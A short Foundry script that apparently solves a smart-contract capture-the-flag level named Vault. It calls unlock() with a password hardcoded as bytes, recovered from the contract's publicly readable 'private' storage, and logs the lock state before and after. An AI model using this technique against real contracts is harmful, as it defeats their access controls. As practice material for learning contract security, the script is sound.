// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Vault} from "../src/level8/Vault.sol";
import "forge-std/console.sol";

contract level8Exploit is Script {
    Vault vault = Vault(0x0c8f47c8F0d39E2b738145450a38A1e5b09A97CB);

    function run() external {
        vm.startBroadcast();
        console.log("lock: ", vault.locked());
        vault.unlock(
            0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        );
        console.log("lock: ", vault.locked());

        vm.stopBroadcast();
    }
}
